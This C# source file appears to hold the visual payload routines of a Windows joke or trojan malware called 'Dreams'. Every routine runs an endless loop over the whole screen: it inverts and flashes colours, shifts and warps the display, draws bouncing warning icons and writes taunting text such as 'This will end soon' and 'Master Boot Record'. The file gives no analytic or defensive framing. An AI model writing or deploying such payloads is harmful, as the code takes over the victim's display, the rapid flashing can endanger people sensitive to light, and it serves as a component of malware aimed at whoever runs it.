using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Vanara.PInvoke;
using static Vanara.PInvoke.HWND;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.Gdi32;
using static Vanara.PInvoke.Gdi32.RasterOperationMode;
using static Vanara.PInvoke.User32;
using static Vanara.PInvoke.User32.SystemMetric;
using System.Drawing;

namespace Dreams
{
    public class GDI
    {
        public static void TextPayload()
        {
            Random rand = new Random();

            while (true)
            {
                int w = rand.Next(GetSystemMetrics(0)),
    h = rand.Next(GetSystemMetrics((SystemMetric)1));
                var dc = GetDC(NULL);
                var font = CreateFont(40, 0, rand.Next(60), 0, 700, true, true, false, 0, 0, 0, 0, 0, "Arial");
                string[] texts = {"Dreams.exe",
                    "Have a nice dream",
                    "This will end soon",
                    "Master Boot Record" };
                int index = rand.Next(texts.Length);
                SelectObject(dc, font);
                var color = new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255));
                var color2 = new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255));
                SetTextColor(dc, color);
                SetBkColor(dc, color2);
                TextOut(dc, w, h, texts[index], texts[index].Length);
                DeleteDC(dc);
                Sleep(30);
            }
        }
        public static void GDI1()
        {
            int w = GetSystemMetrics(0),
                h = GetSystemMetrics((SystemMetric)1);
            Random rand = new Random();
            int i = 0;
            while (true)
            {
                var dc = GetDC(NULL);
                var dcC = CreateCompatibleDC(dc);
                var hbitmap = CreateCompatibleBitmap(dc, w, h);
                var oldbitmap = SelectObject(dcC, hbitmap);
                BitBlt(dcC, 0, 0, w, h, dc, 0, 0, SRCCOPY);
                int offsetX = rand.Next(-4, 4);
                int offsetY = rand.Next(-4, 4);
                i += 4;
                if (i >= rand.Next(100))
                {
                    RedrawWindow(HWND.NULL, null, HRGN.NULL,
    RedrawWindowFlags.RDW_INVALIDATE |
    RedrawWindowFlags.RDW_ERASE |
    RedrawWindowFlags.RDW_ALLCHILDREN);
                    i = 0;
                }
                BitBlt(dc, offsetX, offsetY, w, h, dc, 0, 0, SRCCOPY);

                DeleteDC(dc);
                DeleteDC(dcC);
                DeleteObject(hbitmap);
                DeleteObject(oldbitmap);
                Sleep(10);
            }
        }
        public static void DrawInvertRect(int x, int y, int w, int h)
        {
            var hdc = GetDC(NULL);
            var hrgn = CreateRectRgn(x, y, w + x, h + y);



            SelectClipRgn(hdc, hrgn);
            BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCERASE);

            DeleteObject(hrgn);
            ReleaseDC(NULL, hdc);
        }
        public static void DrawInvertCircle(int x, int y, int w, int h)
        {
            var hdc = GetDC(NULL);
            var hrgn = CreateEllipticRgn(x, y, w + x, h + y);



            SelectClipRgn(hdc, hrgn);
            BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCERASE);

            DeleteObject(hrgn);
            ReleaseDC(NULL, hdc);
        }
        public static void InvertForms()
        {
            Random rand = new Random();
            RECT rect;
            GetWindowRect(GetDesktopWindow(), out rect);
            int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

            for (int t = 0; ; t++)
            {
                int size = 1000;
                int x = rand.Next(w + size) - size / 2, y = rand.Next(h + size) - size / 2;
                int x2 = rand.Next(w + size) - size / 2, y2 = rand.Next(h + size) - size / 2;

                for (int i = 0; i < size; i += 100)
                {
                    DrawInvertCircle(x - i / 2, y - i / 2, i, i);
                    DrawInvertRect(x2 - i / 2, y2 - i / 2, i, i);

                    Sleep(1);
                }
            }
        }
        public static void GDI4()
        {
            int w = GetSystemMetrics(0),
                h = GetSystemMetrics((SystemMetric)1);
            Random rand = new Random();
            int i = 0;
            while (true)
            {
                var dc = GetDC(NULL);
                var dcC = CreateCompatibleDC(dc);
                var hbitmap = CreateCompatibleBitmap(dc, w, h);
                var oldbitmap = SelectObject(dcC, hbitmap);
                BitBlt(dcC, 0, 0, w, h, dc, 0, 0, SRCCOPY);
                int offsetX = rand.Next(-4, 4);
                int offsetY = rand.Next(-4, 4);
                if (rand.Next(5) == 4)
                {
                    BitBlt(dc, offsetX, offsetY, w, h, dc, 0, 1, (RasterOperationMode)0x999999);
                }
                DeleteDC(dc);
                DeleteDC(dcC);
                DeleteObject(hbitmap);
                DeleteObject(oldbitmap);
                Sleep(70);
            }
        }
        public static void GDI7()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics((SystemMetric)1);
            Point[] point = new Point[3];
            while (true)
            {
                RECT rc = new RECT(0, 0, w, h);
                var dc = GetDC(HWND.NULL);
                var hdc = CreateCompatibleDC(dc);
                var hbit = CreateCompatibleBitmap(dc, w, h);
                var holdbit = SelectObject(hdc, hbit);
                point[0].X = (rc.left + 1) - 0;
                point[0].Y = (rc.top - 1) - 0;
                point[1].X = (rc.right + 1) - 0;
                point[1].Y = (rc.top - 1) - 0;
                point[2].X = (rc.left + 1) - 0;
                point[2].Y = (rc.bottom - 1) - 0;
                PlgBlt(dc, point, dc, rc.left + 10, rc.top + 10, (rc.right + rc.left) - 10, (rc.bottom + rc.top) - 10, HBITMAP.NULL, 0, 0);
                Random rand = new Random();
                var brush = CreateSolidBrush(new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255)));
                SelectObject(dc, brush);
                PatBlt(dc, 0, 0, w, h, PATINVERT);
                DeleteObject(brush);
                DeleteDC(dc);
                DeleteDC(dc);
                DeleteDC(hdc);
                DeleteObject(hbit);
                DeleteObject(holdbit);

            }
        }
        public static void GDI6()
        {

            Random rand = new Random();
            int w = GetSystemMetrics(0), h = GetSystemMetrics((SystemMetric)1);
            while (true)
            {
                var dc = GetDC(IntPtr.Zero);
                var brush = CreateSolidBrush(new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255)));
                SelectObject(dc, brush);
                PatBlt(dc, 0, 0, w, h, PATINVERT);
                DeleteObject(brush);
                DeleteDC(dc);
            }
        }
        public static void Payload1()
        {
            Random rand = new Random();
            var dc = GetDC(NULL);

            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics((SystemMetric)1);


            int x = w / 2;
            int y = h / 2;


            int xDirection = 1;
            int yDirection = 1;
            int size = 10;

            int speed = 10;


            while (true)
            {
                DrawIcon(dc, x, y, LoadIcon(HINSTANCE.NULL, IDI_WARNING));
                DrawIcon(dc, x - 40, y, LoadIcon(HINSTANCE.NULL, IDI_WARNING));
                DrawIcon(dc, x - 60, y, LoadIcon(HINSTANCE.NULL, IDI_ERROR));
                DrawIcon(dc, x - 80, y, LoadIcon(HINSTANCE.NULL, IDI_INFORMATION));
                DrawIcon(dc, x - 100, y, LoadIcon(HINSTANCE.NULL, IDI_APPLICATION));
                DrawIcon(dc, x - 40, y + 40, LoadIcon(HINSTANCE.NULL, IDI_WARNING));
                DrawIcon(dc, x - 60, y + 60, LoadIcon(HINSTANCE.NULL, IDI_ERROR));
                DrawIcon(dc, x - 80, y + 80, LoadIcon(HINSTANCE.NULL, IDI_INFORMATION));
                DrawIcon(dc, x - 100, y + 100, LoadIcon(HINSTANCE.NULL, IDI_APPLICATION));

                x += xDirection * speed;
                y += yDirection * speed;

                if (x - size <= 0 || x + size >= w)
                {
                    xDirection *= -1;
                }
                if (y - size <= 0 || y + size >= h)
                {
                    yDirection *= -1;
                }


                Sleep(1);

            }
            


        }
       
        public static void GDI5()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics((SystemMetric)1);
            int i = 0;
            Random rand = new Random();
            while (true)
            {
                var color = CreateSolidBrush(new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255)));
                i++;
                var dc = GetDC(NULL);
                BitBlt(dc, 0, 0, w, h, dc, -5, 0, SRCPAINT);
                BitBlt(dc, 0, 0, w, h, dc, w -5, 0, SRCPAINT);
                SelectObject(dc, color);
                if (rand.Next(3) == 1)
                {
                    PatBlt(dc, 0, 0, w, h, PATINVERT);
                }
                if(rand.Next(3) == 2)
                {
                    RedrawWindow(NULL, null, HRGN.NULL,
RedrawWindowFlags.RDW_INVALIDATE |
RedrawWindowFlags.RDW_ERASE |
RedrawWindowFlags.RDW_ALLCHILDREN);
                    RedrawWindow(NULL, null, HRGN.NULL,
RedrawWindowFlags.RDW_INVALIDATE |
RedrawWindowFlags.RDW_ERASE |
RedrawWindowFlags.RDW_ALLCHILDREN);
                    RedrawWindow(NULL, null, HRGN.NULL,
RedrawWindowFlags.RDW_INVALIDATE |
RedrawWindowFlags.RDW_ERASE |
RedrawWindowFlags.RDW_ALLCHILDREN);
                }
                DeleteDC(dc);
            }
        }
            public static void GDI3()
            {
            int w = GetSystemMetrics(0),
            h = GetSystemMetrics((SystemMetric)1);
            Random rand = new Random();
            while (true)
            {
                var dc = GetDC(NULL);
                var brush = CreateSolidBrush(new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255)));
                SelectObject(dc, brush);
                if (rand.Next(5) == 4)
                {
                    PatBlt(dc, 0, 0, w, h, PATINVERT);
                }
                DeleteDC(dc);
                DeleteObject(brush);
                Sleep(100);
            }
        }
        public static void GDI2()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics((SystemMetric)1);
            Random rand = new Random();
            int i = 0;
            Point[] point = new Point[3];
            while (true)
            {
                RECT rc = new RECT(0, 0, w, h);
                var dc = GetDC(HWND.NULL);
                var hdc = CreateCompatibleDC(dc);
                var hbit = CreateCompatibleBitmap(dc, w, h);
                var holdbit = SelectObject(hdc, hbit);
                if (rand.Next(10) == 9)
                {
                    if (i == 1)
                    {
                        point[0].X = (rc.left + 30) + 0;
                        point[0].Y = (rc.top - 30) + 0;

                        point[1].X = (rc.right + 30) + 0;
                        point[1].Y = (rc.top + 30) + 0;

                        point[2].X = (rc.left - 30) + 0;
                        point[2].Y = (rc.bottom - 30) + 0;
                        i = 0;

                    }
                    else
                    {
                        point[0].X = (rc.left - 30) + 0;
                        point[0].Y = (rc.top + 30) + 0;

                        point[1].X = (rc.right - 30) + 0;
                        point[1].Y = (rc.top - 30) + 0;

                        point[2].X = (rc.left + 30) + 0;
                        point[2].Y = (rc.bottom + 30) + 0;
                        i = 1;

                    }
                }


                PlgBlt(dc, point, dc, rc.left, rc.top, (rc.right - rc.left), (rc.bottom + rc.top), HBITMAP.NULL, 0, 0);

                DeleteObject(holdbit);
                DeleteObject(hbit);
                DeleteDC(dc);
                DeleteDC(hdc);
                Sleep(20);

            }

        }
    }
}
